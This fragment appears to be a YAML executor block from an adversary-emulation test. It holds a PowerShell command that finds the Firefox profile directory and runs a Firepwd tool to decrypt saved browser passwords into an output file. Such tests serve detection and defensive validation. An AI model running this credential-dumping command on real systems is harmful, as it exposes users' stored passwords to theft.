  executor:
    name: powershell
    command: |
      $PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
      cmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
